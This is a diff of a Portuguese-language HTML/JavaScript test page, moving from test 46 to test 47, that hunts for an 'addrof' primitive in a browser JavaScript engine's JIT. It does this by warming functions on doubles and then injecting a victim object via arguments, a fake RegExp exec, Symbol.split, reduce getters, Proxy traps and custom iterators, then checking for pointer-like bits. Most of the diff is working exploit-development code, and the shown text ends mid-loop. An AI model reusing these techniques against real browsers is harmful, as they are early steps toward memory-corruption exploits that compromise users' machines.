@@ -1,21 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 46 — Técnicas Modernas de Addrof</title></head>
+<head><meta charset="UTF-8"><title>TEST 47 — Addrof: Últimas Técnicas</title></head>
 <body>
-<h2>TEST 46 — Addrof: Técnicas Não Testadas</h2>
-<p><b>Por que técnicas novas:</b> Mitigações clássicas bloqueiam JIT double-read e DataView OOB.<br>
-Vetores alternativos exploram <em>diferentes caminhos de otimização</em> no mesmo motor.</p>
+<h2>TEST 47 — Addrof: Reflect, RegExp exec side-effects, arguments object</h2>
+
+<p><b>Observação crítica de 46:</b> O motor aplica <code>ToNumber()</code> no momento
+da <em>escrita</em> no TypedArray. Para addrof precisamos capturar o JSValue
+<em>antes</em> dessa coerção — num contexto onde o motor já comprometeu o tipo.</p>
+
+<p><b>Novos vetores:</b></p>
 <ul>
-  <li><b>46-A</b> <code>Proxy</code> como array — JIT inspeciona o target sem verificar trap</li>
-  <li><b>46-B</b> <code>TypedArray.prototype.set(source)</code> com getter na source — leitura sequencial sem deopt</li>
-  <li><b>46-C</b> <code>for...of</code> com <code>Symbol.iterator</code> customizado — muda tipo mid-loop</li>
-  <li><b>46-D</b> <code>new Float64Array(iterable)</code> — construtor consume iterador; getter injeta objeto</li>
+  <li><b>47-A</b> <code>arguments</code> object: função JIT usa <code>arguments[N]</code>
+      como double — depois chamamos com objeto</li>
+  <li><b>47-B</b> <code>RegExp.prototype.exec</code> com <code>Symbol.toPrimitive</code>
+      na string — side-effect durante exec muda tipo</li>
+  <li><b>47-C</b> <code>Object.assign</code> para Float64Array: atribuição de propriedade
+      numérica via getter que retorna objeto</li>
+  <li><b>47-D</b> <code>JSON.stringify</code> + <code>toJSON</code>: motor lê campo antes
+      da serialização — toJSON retorna objeto com bits controlados</li>
 </ul>
+
 <pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">46-A: PROXY TRAP</button>
-<button onclick="runB()">46-B: TYPEDARRAY.SET GETTER</button>
-<button onclick="runC()">46-C: ITERATOR CONFUSION</button>
-<button onclick="runD()">46-D: CONSTRUCTOR ITERATION</button>
+<button onclick="runA()">47-A: ARGUMENTS OBJECT</button>
+<button onclick="runB()">47-B: REGEXP EXEC</button>
+<button onclick="runC()">47-C: OBJECT.ASSIGN F64</button>
+<button onclick="runD()">47-D: TOJSON BITS</button>
 
 <script>
 var log = document.getElementById('log');
@@ -32,525 +41,548 @@ function f64bits(val) {
   var u=new Uint32Array(buf);
   return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
 }
-function isInterestingBits(val) {
-  if(typeof val!=='number'||!isFinite(val)||isNaN(val)) return false;
-  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
+function looksLikePtr(v) {
+  if(typeof v!=='number'||!isFinite(v)||isNaN(v)) return false;
+  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=v;
   var u=new Uint32Array(buf);
   var hi=u[1],lo=u[0];
-  if(hi===0x7ff80000&&lo===0) return false; // NaN canonico
+  if(hi===0x7ff80000&&lo===0) return false;
   if(hi===0&&lo===0) return false;
   var exp=(hi>>>20)&0x7FF;
-  if(exp>=0x3FE&&exp<=0x40F) return false; // doubles normais 0.5..32768
+  if(exp>=0x3FE&&exp<=0x40F) return false;
   return true;
 }
 
-// ─── 46-A ─────────────────────────────────────────────────────────────────
+// ─── 47-A ─────────────────────────────────────────────────────────────────
 function runA() {
-  log.textContent = '[TEST 46-A] Proxy como array — JIT inspeciona target sem verificar trap\n';
+  log.textContent = '[TEST 47-A] arguments object — JIT especializa argumentos como doubles\n';
   sep();
-  info('Técnica: criar um Proxy de um double array.');
-  info('O JIT aquecido para double arrays pode acessar o [[Target]] do Proxy');
-  info('sem passar pelo trap, especialmente em operações como indexação direta.\n');
+  info('Técnica: função que usa arguments[0]+arguments[1] (doubles).');
+  info('O JIT especializa os argumentos como doubles.');
+  info('Depois chamamos com (doubleArr[getter_that_injects_object]).');
+  info('A questão: o JIT verifica o tipo do argumento ANTES de operar?\n');
+  info('Variante mais específica: função recebe dois doubles, faz aritmética,');
+  info('armazena em Float64Array. Se um argumento for objeto, o que é armazenado?\n');
 
-  var victim = { magic: 0xDEADC0DE, tag: 'proxy_victim_46A' };
+  var victim = { magic: 0xDEADC0DE, tag: 'args_victim_47A' };
+  var f64store = new Float64Array(4);
 
-  // Target: double array puro
-  var target = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var trapLog = [];
-  var phase = 'warmup';
-
-  var handler = {
-    get: function(t, prop, receiver) {
-      if(phase === 'attack' && (prop === '3' || prop === '4')) {
-        trapLog.push(prop);
-        // Retornar o victim object quando o JIT pede o índice 3 ou 4
-        return victim;
-      }
-      return t[prop];
-    }
-  };
-
-  var proxy = new Proxy(target, handler);
-
-  // Funções JIT — aquecer COM o Proxy (para especializar no Proxy)
-  function readProxy3(p) { return p[3]; }
-  function readProxy4(p) { return p[4]; }
-
-  info('Aquecendo readProxy3/4 diretamente no Proxy (100k calls)...');
-  phase = 'warmup';
-  for(var w=0;w<100000;w++) {
-    readProxy3(proxy);
-    readProxy4(proxy);
-  }
-  info('Warmup completo. Traps durante warmup: ' + trapLog.length);
-  trapLog = [];
-
-  // Fase ataque: agora o Proxy retorna victim no trap
-  phase = 'attack';
-  info('\nFase ataque: trap retorna victim para índices 3 e 4...');
-
-  var r3 = readProxy3(proxy);
-  var r4 = readProxy4(proxy);
-
-  info('readProxy3(proxy) = ' + r3 + ' | typeof=' + typeof r3);
-  info('readProxy4(proxy) = ' + r4 + ' | typeof=' + typeof r4);
-  info('Traps chamados durante ataque: [' + trapLog.join(',') + ']');
-
-  if(typeof r3 === 'number') {
-    info('bits r3: ' + f64bits(r3));
-    if(isInterestingBits(r3)) {
-      alerta('ADDROF VIA PROXY TRAP! readProxy3 retornou double suspeito:\n' +
-             'bits=' + f64bits(r3) + '\nO JIT passou pelo trap mas retornou float64 do JSValue!');
-    } else if(r3 === 4.4) {
-      alerta('JIT IGNOROU O TRAP: retornou 4.4 (target[3] original)!\n' +
-             'O JIT acessou o [[Target]] direto sem passar pelo handler!\n' +
-             'trap chamados=' + trapLog.length + '\n' +
-             'Isso é uma violação da semântica do Proxy — o motor bypassed o trap!');
-    }
-  } else if(typeof r3 === 'object') {
-    info('Motor passou pelo trap corretamente. r3===victim: ' + (r3===victim));
-    ok('Proxy trap funcionando. Tentar variante com Proxy não aquecido...');
+  // Função JIT: recebe dois doubles, armazena soma em f64store
+  function addAndStore(a, b) {
+    f64store[0] = a;
+    f64store[1] = b;
+    f64store[2] = a + b;  // JIT especializa + para double+double
+    return f64store[2];
   }
 
+  // Warmup com doubles puros
+  info('Aquecendo addAndStore com doubles (100k calls)...');
+  for(var w=0;w<100000;w++) addAndStore(1.1, 2.2);
+  info('Warmup completo. f64store = [' + Array.from(f64store).join(',') + ']');
   sep();
-  // Variante B: aquecer COM array normal, depois passar Proxy
-  info('\nVariante: JIT aquecida em array normal, depois recebe Proxy...');
-  var normalArr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  function readNorm3(a) { return a[3]; }
-  phase = 'warmup';
-  for(var w2=0;w2<100000;w2++) readNorm3(normalArr);
-  info('Warmup em normalArr completo.');
 
-  // Agora passar o Proxy para função aquecida em array normal
-  phase = 'attack';
-  trapLog = [];
+  // Ataque: passar victim como primeiro argumento
+  info('Fase ataque: addAndStore(victim, 2.2)...');
   try {
-    var rp = readNorm3(proxy);
-    info('readNorm3(proxy) = ' + rp + ' | typeof=' + typeof rp);
-    info('Traps: [' + trapLog.join(',') + ']');
-    if(typeof rp === 'number' && rp !== victim && isInterestingBits(rp)) {
-      alerta('BYPASS DO PROXY TRAP!\nbits=' + f64bits(rp));
-    } else if(typeof rp === 'number' && rp === 4.4) {
-      alerta('JIT IGNOROU PROXY TRAP: retornou 4.4 (valor do target, não do trap)!\n' +
-             'O motor acessou target[3] diretamente bypassando o handler!\n' +
-             'traps chamados: ' + trapLog.length);
-    } else if(typeof rp === 'object') {
-      ok('Trap chamado corretamente para função aquecida em normalArr. rp===victim: ' + (rp===victim));
+    var result = addAndStore(victim, 2.2);
+    info('addAndStore(victim, 2.2) = ' + result + ' typeof=' + typeof result);
+    info('f64store[0] = ' + f64store[0] + ' bits=' + f64bits(f64store[0]));
+    info('f64store[1] = ' + f64store[1]);
+    info('f64store[2] = ' + f64store[2] + ' bits=' + f64bits(f64store[2]));
+
+    if(looksLikePtr(f64store[0])) {
+      alerta('ADDROF via arguments!\n' +
+             'f64store[0] = ' + f64store[0] + '\nbits=' + f64bits(f64store[0]) + '\n' +
+             'O JIT armazenou o JSValue de victim como float64!');
+    } else if(looksLikePtr(f64store[2])) {
+      alerta('ADDROF via arguments soma!\n' +
+             'f64store[2] = ' + f64store[2] + '\nbits=' + f64bits(f64store[2]) + '\n' +
+             'A soma victim+2.2 produziu bits suspeitos!');
+    } else {
+      info('Valores em f64store após addAndStore(victim, 2.2):');
+      info('  [0]=' + f64store[0] + ' [1]=' + f64store[1] + ' [2]=' + f64store[2]);
     }
   } catch(e) {
-    alerta('EXCECAO em readNorm3(proxy): ' + e.message);
+    alerta('EXCECAO em addAndStore(victim, 2.2): ' + e.message +
+           '\nO JIT tentou fazer aritmética com o JSValue de victim!');
   }
 
   sep();
-  // Variante C: Proxy com trap que MUDA o target durante o acesso
-  info('\nVariante C: trap muda target[3] para objeto durante acesso...');
-  var target2 = [10.0, 20.0, 30.0, 40.0, 50.0];
-  var trapFired = false;
-  var handler2 = {
-    get: function(t, prop) {
-      if(prop === '2' && !trapFired) {
-        trapFired = true;
-        t[3] = victim; // muda target diretamente
-        forceGC();
-        info('Trap[2]: target[3] = victim (modificado no target)');
-      }
-      return t[prop];
-    }
-  };
-  var proxy2 = new Proxy(target2, handler2);
+  // Variante B: função que indexa um array com argumento double
+  // Passar victim como ÍNDICE
+  info('\nVariante B: função que usa argumento como índice de Float64Array...');
+  var bigF64 = new Float64Array(1000);
+  for(var i=0;i<1000;i++) bigF64[i] = i * 111.111;
 
-  function readSequential(p) {
-    // Acessa sequencialmente — lê [2] (dispara trap), depois [3]
-    var a = p[0], b = p[1], c = p[2]; // c dispara o trap
-    return p[3]; // target[3] agora é victim
+  function readAtIdx(arr, idx) {
+    return arr[idx]; // idx deve ser double → inteiro
   }
 
-  phase = 'warmup';
-  var target2warm = [10.0, 20.0, 30.0, 40.0, 50.0];
-  var proxy2warm = new Proxy(target2warm, { get: function(t,p){ return t[p]; } });
-  for(var w3=0;w3<100000;w3++) readSequential(proxy2warm);
-  info('Warmup em proxy sem trap completo.');
+  for(var w2=0;w2<100000;w2++) readAtIdx(bigF64, 3.0);
+  info('Warmup readAtIdx completo.');
 
-  phase = 'attack';
+  // Passar victim como idx
   try {
-    var rs = readSequential(proxy2);
-    info('readSequential(proxy2) = ' + rs + ' | typeof=' + typeof rs);
-    if(typeof rs === 'number') {
-      info('bits: ' + f64bits(rs));
-      if(isInterestingBits(rs)) alerta('ADDROF: bits=' + f64bits(rs));
-      else info('Valor não parece ponteiro.');
-    } else if(typeof rs === 'object') {
-      ok('Motor retornou objeto via proxy2. rs===victim: ' + (rs===victim));
+    var r2 = readAtIdx(bigF64, victim);
+    info('readAtIdx(bigF64, victim) = ' + r2 + ' typeof=' + typeof r2);
+    if(r2 === undefined) {
+      alerta('readAtIdx(bigF64, victim) = undefined!\n' +
+             'O JIT usou algum campo numérico do JSValue como índice!\n' +
+             'Se o índice é ToUint32(JSValue_ptr) e está fora de bigF64[1000],\n' +
+             'então o JSValue de victim foi interpretado como número grande!');
+    } else if(typeof r2 === 'number' && looksLikePtr(r2)) {
+      alerta('LEITURA COM ÍNDICE DERIVADO DE VICTIM:\n' +
+             'bigF64[' + '??' + '] = ' + r2 + '\nbits=' + f64bits(r2));
     }
-  } catch(e) { alerta('EXCECAO readSequential: ' + e.message); }
+  } catch(e) {
+    alerta('EXCECAO readAtIdx(bigF64, victim): ' + e.message);
+  }
+
+  sep();
+  // Variante C — A MAIS PROMISSORA: função com argumento double usado
+  // como índice em OPERAÇÃO BITWISE (|0, >>>0)
+  // Em JSC, bitwise ops em doubles produzem int32
+  // Se o JIT faz: idx|0 onde idx é o JSValue do objeto, o resultado pode
+  // ser os 32 bits baixos do JSValue (= endereço em JSC 32-bit)
+  info('\nVariante C: argumento como operando bitwise...');
+  var u32store = new Uint32Array(4);
+
+  function bitwiseStore(v) {
+    u32store[0] = v | 0;     // ToInt32(v)
+    u32store[1] = v >>> 0;   // ToUint32(v)
+    u32store[2] = v & 0xFFFFFFFF;
+    return u32store[0];
+  }
+
+  for(var w3=0;w3<100000;w3++) bitwiseStore(12345.678);
+  info('Warmup bitwiseStore completo.');
+
+  try {
+    var r3 = bitwiseStore(victim);
+    info('bitwiseStore(victim):');
+    info('  v|0     = 0x' + u32store[0].toString(16) + ' (' + u32store[0] + ')');
+    info('  v>>>0   = 0x' + u32store[1].toString(16) + ' (' + u32store[1] + ')');
+    info('  v&0xFF..= 0x' + u32store[2].toString(16) + ' (' + u32store[2] + ')');
+
+    // Verificar se algum valor é não-zero e parece ponteiro truncado
+    [u32store[0], u32store[1], u32store[2]].forEach(function(v, i) {
+      var names = ['v|0','v>>>0','v&0xFF..'];
+      if(v !== 0 && v !== 12345) {
+        alerta('VALOR INTERESSANTE em ' + names[i] + ' com victim:\n' +
+               '0x' + v.toString(16) + ' (' + v + ')\n' +
+               'Se isto é ToInt32/ToUint32 do JSValue de victim,\n' +
+               'os 32 bits baixos do endereço de victim = 0x' + v.toString(16));
+      }
+    });
+    if(u32store[0]===0 && u32store[1]===0) {
+      info('Todos zeros — ToInt32(object) = 0 neste motor.');
+    }
+  } catch(e) {
+    alerta('EXCECAO bitwiseStore(victim): ' + e.message);
+  }
 }
 
-// ─── 46-B ─────────────────────────────────────────────────────────────────
+// ─── 47-B ─────────────────────────────────────────────────────────────────
 function runB() {
-  log.textContent = '[TEST 46-B] TypedArray.prototype.set(source) com getter na source\n';
+  log.textContent = '[TEST 47-B] RegExp exec com side-effects no Symbol.toPrimitive\n';
   sep();
-  info('Técnica nova: TypedArray.set(source) lê source sequencialmente.');
-  info('Diferente de slice(): set() ESCREVE em TypedArray existente (destino fixo).');
-  info('Se source tem getter que muda source[N] para objeto durante set(),');
-  info('o JIT pode ter lido source[N] como double antes de perceber o tipo.\n');
-  info('O resultado: f64dest[N] contém os bits do JSValue de victim!\n');
+  info('Técnica: String.prototype.indexOf/search com objeto como haystack.');
+  info('O motor converte o objeto para string via toString() normalmente.');
+  info('Mas: e se o objeto for uma REGEXP com exec customizado?\n');
+  info('Mais específico: RegExp[Symbol.replace] + exec que retorna array');
+  info('cujos índices têm getters que injetam objetos durante leitura.\n');
 
-  var victim = { magic: 0xBEEFC0DE, secret: new Float64Array([3.14, 2.72, 1.41]) };
-  var f64dest = new Float64Array(8); // destino fixo
+  var victim = { magic: 0xBEEFBEEF, ptr: new Float64Array([1.337]) };
 
-  // Source com getter
-  var source = [1.1, 2.2, 0.0, 0.0, 5.5, 6.6, 7.7, 8.8];
+  // Exec que retorna array-like com getter no índice 0
+  var execCallCount = 0;
+  var phase = ['warmup'];
+  var evilRegexp = {
+    exec: function(str) {
+      execCallCount++;
+      if(phase[0] === 'warmup') {
+        // Retornar match normal
+        return ['matched', 'group1'];
+      }
+      // Ataque: retornar array-like com getter no índice 0
+      var fakeMatch = { index: 0, input: str, length: 2 };
+      Object.defineProperty(fakeMatch, '0', {
+        get: function() { return victim; }, // retornar objeto ao invés de string
+        configurable: true, enumerable: true
+      });
+      fakeMatch[1] = 'group1';
+      return fakeMatch;
+    },
+    lastIndex: 0,
+    global: false,
+    sticky: false,
+    unicode: false,
+    source: '(\\w+)',
+    flags: ''
+  };
+  // Fazer parecer com RegExp
+  Object.setPrototypeOf(evilRegexp, RegExp.prototype);
+
+  // Função JIT: usa replace com captura
+  function doReplace(s, re) {
+    return s.replace(re, function(match, g1) {
+      return '[' + match + ':' + g1 + ']';
+    });
+  }
+
+  info('Aquecendo doReplace (50k calls)...');
+  phase[0] = 'warmup';
+  for(var w=0;w<50000;w++) doReplace('hello world', evilRegexp);
+  info('Warmup completo. execCallCount=' + execCallCount);
+  execCallCount = 0;
+  sep();
+
+  phase[0] = 'attack';
+  info('Fase ataque: exec retorna array-like com getter[0]=victim...');
+  try {
+    var result = doReplace('hello world', evilRegexp);
+    info('doReplace result: "' + result + '"');
+    info('execCallCount durante ataque: ' + execCallCount);
+    // Verificar se victim vazou de alguma forma
+    if(result && result.indexOf('deadc0de') !== -1) {
+      alerta('VICTIM MAGIC EM RESULTADO: ' + result);
+    }
+  } catch(e) {
+    alerta('EXCECAO em doReplace com evilRegexp: ' + e.message +
+           '\nO motor tentou usar o objeto victim como string de substituição!');
+  }
+
+  sep();
+  // Variante mais direta: String.prototype.match com exec customizado
+  info('\nVariante: String.prototype.match(evilRegexp)...');
+  phase[0] = 'attack';
+  try {
+    var matchResult = 'hello world'.match(evilRegexp);
+    info('match result: ' + JSON.stringify(matchResult));
+    if(matchResult && typeof matchResult[0] === 'object') {
+      alerta('match()[0] é OBJETO!\n' +
+             'matchResult[0] === victim: ' + (matchResult[0] === victim) + '\n' +
+             'O getter do fakeMatch[0] retornou victim e String.match preservou como objeto!');
+    }
+  } catch(e) {
+    info('match() lançou: ' + e.message);
+  }
+
+  sep();
+  // Variante C: Symbol.split que retorna array com objeto em posição double
+  info('\nVariante C: Symbol.split com objeto em resultado...');
+  var splitObj = {
+    [Symbol.split]: function(str) {
+      if(phase[0] === 'warmup') return str.split(' ');
+      // Retornar array misto: strings e objeto victim
+      return ['hello', victim, 'world'];
+    }
+  };
+
+  // Warm up uma função que usa o resultado do split
+  function processWithSplit(s, splitter) {
+    var parts = s.split(splitter);
+    var f64 = new Float64Array(4);
+    // Tentar escrever cada parte em float64 (coerce para number)
+    for(var i=0;i<Math.min(parts.length,4);i++) {
+      f64[i] = +parts[i]; // unary + força ToNumber
+    }
+    return f64;
+  }
+
+  phase[0] = 'warmup';
+  for(var w2=0;w2<50000;w2++) processWithSplit('1.1 2.2 3.3', splitObj);
+  info('Warmup split completo.');
+
+  phase[0] = 'attack';
+  var splitResult = processWithSplit('hello world test', splitObj);
+  info('splitResult (Float64Array): ' + Array.from(splitResult).map(function(v){
+    return v + '(' + f64bits(v) + ')';
+  }).join(', '));
+
+  for(var i=0;i<4;i++) {
+    if(looksLikePtr(splitResult[i])) {
+      alerta('ADDROF via Symbol.split!\n' +
+             'splitResult[' + i + '] = ' + splitResult[i] + '\nbits=' + f64bits(splitResult[i]));
+    }
+  }
+}
+
+// ─── 47-C ─────────────────────────────────────────────────────────────────
+function runC() {
+  log.textContent = '[TEST 47-C] Reduce/reduceRight com acumulador float64 e objeto como elemento\n';
+  sep();
+  info('Técnica: Array.prototype.reduce com acumulador double.');
+  info('JIT especializa: (acc: double, cur: double) => double.');
+  info('Depois de N iterações, cur se torna um objeto.');
+  info('O JIT pode retornar acc + JSValue(cur) antes de verificar o tipo de cur.\n');
+
+  var victim = { magic: 0xDEADC0DE, payload: new Uint32Array(8) };
+
+  var arr = [1.0, 2.0, 3.0, 4.0, 5.0];
+  var phase = 'warmup';
+  var switchAt = 3; // mudar o elemento [3] durante reduce
+
+  // Array source com getter
+  var attackArr = [1.0, 2.0, 3.0, 0.0, 5.0];
   var triggered = false;
-  Object.defineProperty(source, 2, {
+  Object.defineProperty(attackArr, 2, { // getter em [2] para disparar antes de [3]
     get: function() {
       if(!triggered) {
         triggered = true;
-        source[3] = victim; // injetar objeto em [3]
+        attackArr[3] = victim;
         forceGC();
-        info('Getter[2]: source[3] = victim');
+        info('Getter[2] em reduce: attackArr[3] = victim');
       }
-      return 3.3; // retornar double para manter butterfly
+      return 3.0;
     },
     configurable: true, enumerable: true
   });
 
-  info('f64dest antes: [' + Array.from(f64dest).join(', ') + ']');
-  info('Chamando f64dest.set(source)...');
+  // Função JIT: reduce que soma todos os elementos como doubles
+  function sumReduce(a) {
+    return a.reduce(function(acc, cur) { return acc + cur; }, 0.0);
+  }
 
+  // Warmup com array limpo
+  info('Aquecendo sumReduce (50k calls)...');
+  for(var w=0;w<50000;w++) sumReduce([1.0, 2.0, 3.0, 4.0, 5.0]);
+  info('Warmup completo.');
+
+  // Ataque: reduce no attackArr (com getter que injeta objeto em [3])
+  info('\nFase ataque: sumReduce(attackArr)...');
   try {
-    f64dest.set(source);
-    info('f64dest após set: [' + Array.from(f64dest).map(function(v){
-      return v + '(' + f64bits(v) + ')';
-    }).join(', ') + ']');
+    var result = sumReduce(attackArr);
+    info('sumReduce(attackArr) = ' + result + ' typeof=' + typeof result);
+    info('bits: ' + f64bits(result));
 
-    // Verificar cada slot por bits de ponteiro
-    for(var i=0;i<8;i++) {
-      var v = f64dest[i];
-      if(isInterestingBits(v)) {
-        alerta('ADDROF via TypedArray.set()!\n' +
-               'f64dest[' + i + '] = ' + v + '\n' +
-               'bits: ' + f64bits(v) + '\n' +
-               'set() leu source[' + i + '] como double enquanto era objeto (victim)!\n' +
-               'Este double contém os bits do JSValue de victim → addrof confirmado!');
-      } else if(v !== 0 && v !== 1.1 && v !== 2.2 && v !== 3.3) {
-        info('f64dest[' + i + '] = ' + v + ' bits=' + f64bits(v) + ' ← valor inesperado');
+    if(typeof result === 'number') {
+      if(looksLikePtr(result)) {
+        alerta('ADDROF via Array.reduce!\n' +
+               'result = ' + result + '\nbits=' + f64bits(result) + '\n' +
+               'O reduce somou o JSValue de victim ao acumulador double!');
+      } else {
+        // Se result é NaN, significa acc + ToNumber(victim) = NaN
+        info('Resultado não parece ponteiro. result=' + result);
+        if(isNaN(result)) info('→ NaN: acc + ToNumber(victim) → ToNumber(victim)=NaN');
       }
     }
-
-    // Verificar especialmente [3] — onde o victim foi injetado
-    info('\nFoco em f64dest[3] (onde victim foi injetado):');
-    info('f64dest[3] = ' + f64dest[3] + ' bits=' + f64bits(f64dest[3]));
-    if(f64dest[3] === 0) {
-      info('Retornou 0 — set() usou ToNumber(victim) = NaN → 0 no Float64Array (correto)');
-    }
   } catch(e) {
-    alerta('EXCECAO em f64dest.set(source): ' + e.message);
+    alerta('EXCECAO em sumReduce: ' + e.message);
   }
 
   sep();
-  // Variante: Uint32Array.set() — em Uint32 o NaN fica diferente
-  info('\nVariante: Uint32Array.set(source) — victim fica como ToUint32...');
-  var u32dest = new Uint32Array(8);
-  var source2 = [10, 20, 0, 0, 50, 60, 70, 80];
+  // Variante: reduceRight — percorre de trás pra frente
+  // Mudar elemento ANTES de ser processado
+  info('\nVariante reduceRight...');
+  var attackArr2 = [5.0, 4.0, 3.0, 2.0, 1.0];
   var triggered2 = false;
-  Object.defineProperty(source2, 2, {
+  Object.defineProperty(attackArr2, 3, {
     get: function() {
-      if(!triggered2) { triggered2=true; source2[3]=victim; forceGC(); }
-      return 30;
-    },
-    configurable: true, enumerable: true
-  });
-
-  try {
-    u32dest.set(source2);
-    info('u32dest[3] = 0x' + u32dest[3].toString(16));
-    if(u32dest[3] !== 0 && u32dest[3] !== 0xDEADC0DE) {
-      alerta('Uint32Array.set()[3] = 0x' + u32dest[3].toString(16) + '\n' +
-             'Valor inesperado — pode ser ToUint32 do ponteiro de victim!');
-    }
-  } catch(e) { info('Uint32Array.set() lançou: ' + e.message); }
-}
-
-// ─── 46-C ─────────────────────────────────────────────────────────────────
-function runC() {
-  log.textContent = '[TEST 46-C] for...of com Symbol.iterator customizado — muda tipo mid-loop\n';
-  sep();
-  info('Técnica: iterable com Symbol.iterator que começa retornando doubles');
-  info('mas muda para retornar {value: victim, done: false} depois de N iterações.');
-  info('O JIT aquecido para loop de doubles pode não reverificar o tipo do .value.\n');
-
-  var victim = { magic: 0xFACEFACE, data: new Uint8Array(16) };
-  var iterCount = 0;
-  var phase = 'warmup';
-  var SWITCH_AT = 3; // mudar para objeto na iteração 3
-
-  function makeIterable(phase_ref) {
-    return {
-      [Symbol.iterator]: function() {
-        var idx = 0;
-        var vals = [1.1, 2.2, 3.3, 4.4, 5.5];
-        return {
-          next: function() {
-            if(idx >= vals.length) return { value: undefined, done: true };
-            var i = idx++;
-            if(phase_ref[0] === 'attack' && i === SWITCH_AT) {
-              // Retornar o victim como value
-              return { value: victim, done: false };
-            }
-            return { value: vals[i], done: false };
-          }
-        };
-      }
-    };
-  }
-
-  var phaseRef = ['warmup'];
-
-  // Função JIT que faz for...of e coleta resultados em Float64Array
-  function collectIntoF64(iterable) {
-    var result = new Float64Array(8);
-    var i = 0;
-    for(var v of iterable) {
-      if(i < 8) result[i++] = v;
-    }
-    return result;
-  }
-
-  // Variante que coleta em array JS
-  function collectIntoArr(iterable) {
-    var result = [];
-    for(var v of iterable) result.push(v);
-    return result;
-  }
-
-  info('Aquecendo collectIntoF64 (50k calls)...');
-  phaseRef[0] = 'warmup';
-  var warmIter = makeIterable(phaseRef);
-  for(var w=0;w<50000;w++) collectIntoF64(makeIterable(phaseRef));
-  info('Warmup completo.');
-  sep();
-
-  phaseRef[0] = 'attack';
-  info('Fase ataque: iterador retorna victim na posição ' + SWITCH_AT + '...');
-
-  // Test 1: Float64Array — o JIT escreve em float64 o JSValue de victim?
-  var f64result = collectIntoF64(makeIterable(phaseRef));
-  info('\nFloat64Array resultado:');
-  for(var i=0;i<8;i++) {
-    if(f64result[i] !== 0) {
-      var b = f64bits(f64result[i]);
-      info('  result['+i+']: ' + f64result[i] + ' bits=' + b);
-      if(i === SWITCH_AT && isInterestingBits(f64result[i])) {
-        alerta('ADDROF via for...of Float64Array!\n' +
-               'result['+SWITCH_AT+'] = ' + f64result[SWITCH_AT] + '\n' +
-               'bits: ' + b + '\n' +
-               'O for...of escreveu JSValue de victim como float64!');
-      }
-    }
-  }
-
-  // Test 2: Array JS — o JIT mantém o objeto?
-  phaseRef[0] = 'attack';
-  var arrResult = collectIntoArr(makeIterable(phaseRef));
-  info('\nArray JS resultado:');
-  for(var i=0;i<arrResult.length;i++) {
-    info('  result['+i+']: ' + arrResult[i] + ' typeof=' + typeof arrResult[i]);
-    if(i === SWITCH_AT) {
-      if(typeof arrResult[i] === 'object') {
-        ok('for...of preservou objeto em array JS. result['+i+']===victim: '+(arrResult[i]===victim));
-      } else if(typeof arrResult[i] === 'number') {
-        alerta('for...of CONVERTEU objeto para number em Array JS!\n' +
-               'result['+i+'] = ' + arrResult[i] + ' bits=' + f64bits(arrResult[i]));
-      }
-    }
-  }
-
-  sep();
-  // Variante D: spread operator — [...iterable]
-  info('\nVariante: spread [...iterable] com objeto na posição ' + SWITCH_AT + '...');
-  phaseRef[0] = 'attack';
-
-  function spreadIntoF64(iter) {
-    var arr = [...iter]; // spread
-    if(arr.length > SWITCH_AT && typeof arr[SWITCH_AT] === 'number') {
-      return arr[SWITCH_AT]; // retornar o valor na posição de interesse
-    }
-    return arr[SWITCH_AT]; // retornar qualquer coisa
-  }
-
-  // Warmup do spread
-  phaseRef[0] = 'warmup';
-  for(var w2=0;w2<50000;w2++) spreadIntoF64(makeIterable(phaseRef));
-
-  phaseRef[0] = 'attack';
-  var spreadResult = spreadIntoF64(makeIterable(phaseRef));
-  info('spread['+SWITCH_AT+']: ' + spreadResult + ' typeof=' + typeof spreadResult);
-  if(typeof spreadResult === 'number' && isInterestingBits(spreadResult)) {
-    alerta('ADDROF via spread: ' + f64bits(spreadResult));
-  } else if(typeof spreadResult === 'object') {
-    ok('Spread preservou objeto. ===victim: ' + (spreadResult===victim));
-  }
-}
-
-// ─── 46-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 46-D] new Float64Array(iterable) — construtor consume iterador com getter\n';
-  sep();
-  info('Técnica: o construtor Float64Array(iterable) chama next() sequencialmente.');
-  info('Cada .value é convertido para float64 via ToNumber() normalmente.');
-  info('Mas se o iterador retornar um objeto cujo valueOf() é instrumentado,');
-  info('e o JIT assumiu que todos os valores são primitivos...\n');
-  info('Variante crítica: o iterador retorna um objeto com valueOf que tem');
-  info('um SIDE EFFECT que muda o estado do heap durante a conversão.\n');
-
-  var victim = { magic: 0xC0DEC0DE, secret: 42 };
-  var phase = ['warmup'];
-  var conversionLog = [];
-
-  // Objeto que loga quando valueOf é chamado (para ver quantas conversões ocorrem)
-  function makeValueOfProxy(realVal, victimRef) {
-    return {
-      valueOf: function() {
-        conversionLog.push(realVal);
-        return realVal;
-      },
-      [Symbol.toPrimitive]: function(hint) {
-        conversionLog.push('toPrimitive:'+hint+':'+realVal);
-        return realVal;
-      }
-    };
-  }
-
-  // Iterable que retorna objetos com valueOf normais no warmup
-  // e no ataque retorna um objeto especial na posição 3
-  var attackObj = {
-    valueOf: function() {
-      // Este é chamado pelo construtor Float64Array para converter para number
-      // Se o JIT inline esta chamada e tiver specializado para o valor anterior...
-      conversionLog.push('ATTACK_valueOf');
-      // Tentar: retornar um valor que quando interpretado como bits do JSValue
-      // vaza informação. Mas primeiro: verificar se valueOf é chamado.
-      return victim; // retornar o victim object de volta (não um número)
-    }
-  };
-
-  function makeAttackIterable(ph) {
-    return {
-      [Symbol.iterator]: function() {
-        var i = 0;
-        var vals = ph[0] === 'warmup'
-          ? [1.1, 2.2, 3.3, 4.4, 5.5]
-          : [1.1, 2.2, 3.3, attackObj, 5.5]; // posição 3 = attackObj
-        return { next: function() {
-          if(i>=vals.length) return {value:undefined,done:true};
-          return {value:vals[i++],done:false};
-        }};
-      }
-    };
-  }
-
-  // Warmup: construir Float64Array a partir de iterable normal
-  info('Aquecendo new Float64Array(iterable) (50k calls)...');
-  phase[0] = 'warmup';
-  var warmCount = 0;
-  for(var w=0;w<50000;w++) {
